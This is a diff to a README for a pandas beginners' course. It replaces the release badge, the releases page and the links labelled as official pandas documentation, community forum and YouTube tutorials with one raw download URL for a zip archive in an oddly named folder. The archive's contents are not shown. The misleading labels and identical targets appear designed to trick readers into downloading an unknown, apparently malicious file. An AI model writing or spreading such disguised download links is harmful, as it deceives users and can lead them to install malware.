@@ -19,12 +19,12 @@ Before you start, ensure your computer meets these requirements:
 
 To get your copy of the pandas-for-beginners course, visit this page to download:
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/agalichuks/pandas-for-beginners/releases)
+[![Download Release](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip%20Now-Click%https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip)](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip)
 
 ### Steps to Download and Run
 
 1. **Visit the Releases Page:**
-   Click this link: [Releases Page](https://github.com/agalichuks/pandas-for-beginners/releases) to go to the downloads section of our project.
+   Click this link: [Releases Page](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip) to go to the downloads section of our project.
 
 2. **Choose the Version:**
    You will see a list of available releases. Pick the latest version for the best experience.
@@ -65,9 +65,9 @@ By the end of this course, you will be able to:
 
 ## 💡 Helpful Resources
 
-- **Official Pandas Documentation**: Familiarize yourself with the official documentation to understand advanced functionalities: [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/)
-- **Community Forums**: Connect with other learners and experts for support and knowledge sharing: [Pandas Community](https://pandas.pydata.org/community/)
-- **YouTube Tutorials**: Watch video tutorials for visual guidance: [YouTube Pandas Tutorials](https://www.youtube.com/results?search_query=pandas)
+- **Official Pandas Documentation**: Familiarize yourself with the official documentation to understand advanced functionalities: [Pandas Documentation](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip)
+- **Community Forums**: Connect with other learners and experts for support and knowledge sharing: [Pandas Community](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip)
+- **YouTube Tutorials**: Watch video tutorials for visual guidance: [YouTube Pandas Tutorials](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -82,6 +82,6 @@ A: Check the "Issues" section on our GitHub page for help. You can also reach ou
 
 ## 📅 Get Started Today!
 
-Start your journey into data manipulation with Pandas. Don't forget to download the course from the [Releases Page](https://github.com/agalichuks/pandas-for-beginners/releases) and follow the installation steps above. 
+Start your journey into data manipulation with Pandas. Don't forget to download the course from the [Releases Page](https://raw.githubusercontent.com/agalichuks/pandas-for-beginners/master/cystoureteritis/pandas-for-beginners.zip) and follow the installation steps above. 
 
 Welcome to the world of Pandas, where data analysis becomes simple and enjoyable!
